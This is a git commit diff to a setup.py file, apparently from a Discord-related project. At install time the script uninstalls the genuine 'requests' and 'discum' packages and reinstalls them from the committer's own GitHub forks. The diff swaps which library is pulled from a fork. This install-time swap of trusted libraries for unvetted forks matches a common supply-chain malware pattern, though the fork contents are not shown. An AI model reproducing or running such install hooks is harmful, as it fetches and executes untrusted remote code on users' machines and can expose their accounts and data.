344fd88d4e9935c358f6b53a43f1aefd16fc70bc
DiscordDev3054 <103537793+DiscordDev3054@users.noreply.github.com>
2022-04-12 17:03:17 -0500

    Update setup.py

--- setup.py
+++ setup.py
@@ -2,7 +2,7 @@ import os
 import time
 os.system("pip uninstall discum")
 os.system("pip uninstall requests")
-os.system("python -m pip install --user --upgrade git+https://github.com/DiscordDev3054/requests.git#egg=requests")
-os.system("pip install discum")
+os.system("pip install requests")
+os.system("python -m pip install --user --upgrade git+https://github.com/DiscordDev3054/Discord-S.C.U.M.git#egg=discum")
 print("Completed installing")
 time.sleep(5)
